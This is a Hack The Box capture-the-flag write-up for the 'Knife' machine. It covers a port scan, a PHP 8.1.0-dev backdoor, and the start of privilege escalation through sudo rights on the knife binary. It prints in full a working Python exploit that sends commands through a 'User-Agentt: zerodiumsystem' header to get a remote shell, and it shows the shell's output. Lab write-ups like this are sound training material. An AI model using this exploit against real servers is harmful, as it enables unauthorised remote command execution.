---
title: HTB - Knife (EN)
author: gpandres
date: 2021-09-08 20:00:00 +0800
categories: [Cybersecurity,HTB,WriteUps]
tags: [HTB,Knife,PHP,GTFOBin,Backdoor]
---



![knifeimg](https://gpandres.github.io/assets/img/posts/knife/knife.jpeg)


<h3 data-toc-skip>We'll start scanning ports with NMAP.</h3>


```console
$ nmap -v 10.10.10.242
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-08 18:20 CEST
Initiating Ping Scan at 20:20
Scanning 10.10.10.242 [2 ports]
Completed Ping Scan at 20:20, 0.07s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 20:20
Completed Parallel DNS resolution of 1 host. at 20:20, 0.03s elapsed
Initiating Connect Scan at 20:20
Scanning 10.10.10.242 [1000 ports]
Discovered open port 22/tcp on 10.10.10.242
Discovered open port 80/tcp on 10.10.10.242
Completed Connect Scan at 20:20, 9.31s elapsed (1000 total ports)
Nmap scan report for 10.10.10.242
Host is up (0.067s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 9.74 seconds
```

<h3 data-toc-skip>Looks like we have a web server and SSH service. Let's try to see what is on the web.</h3>

![knifeweb](https://gpandres.github.io/assets/img/posts/knife/knifeweb.png)

<h3 data-toc-skip>It is a hospital, but I haven't found anything useful on the web.</h3>

<h3 data-toc-skip>With Wappalyzer we can discover what technologies are used to create a website.</h3>

![knifewappalyzer](https://gpandres.github.io/assets/img/posts/knife/knifewappalyzer.png)

<h3 data-toc-skip>Alright, let's search for vulnerabilities for these technologies.</h3>

<h3 data-toc-skip>There's a vulnerability for PHP 8.1.0dev.</h3>
![knifesearch](https://gpandres.github.io/assets/img/posts/knife/knifesearch.png)
<https://www.exploit-db.com/exploits/49933>


<h3 data-toc-skip>I copied the script and executed</h3>


```python
#!/usr/bin/env python3
import os
import re
import requests

host = input("Enter the full host url:\n")
request = requests.Session()
response = request.get(host)

if str(response) == '<Response [200]>':
    print("\nInteractive shell is opened on", host, "\nCan't acces tty; job crontol turned off.")
    try:
        while 1:
            cmd = input("$ ")
            headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "User-Agentt": "zerodiumsystem('" + cmd + "');"
            }
            response = request.get(host, headers = headers, allow_redirects = False)
            current_page = response.text
            stdout = current_page.split('<!DOCTYPE html>',1)
            text = print(stdout[0])
    except KeyboardInterrupt:
        print("Exiting...")
        exit

else:
    print("\r")
    print(response)
    print("Host is not available, aborting...")
    exit

```


```console
$ python3 exploit.py
Enter the full host url:
http://10.10.10.242/

Interactive shell is opened on http://10.10.10.242/
Can't acess tty; job crontol turned off.
$ whoami
james
```
<h3 data-toc-skip>We are in!, let's check the user flag.</h3>

```console
$ cat home/james/user.txt
cb5ddfa28b84d6b930bca47d9bc984b6
```

<h3 data-toc-skip>Now we have to get access with root.</h3>

<h3 data-toc-skip>Check if we can execute commands as root with james</h3>

```console
$ sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

















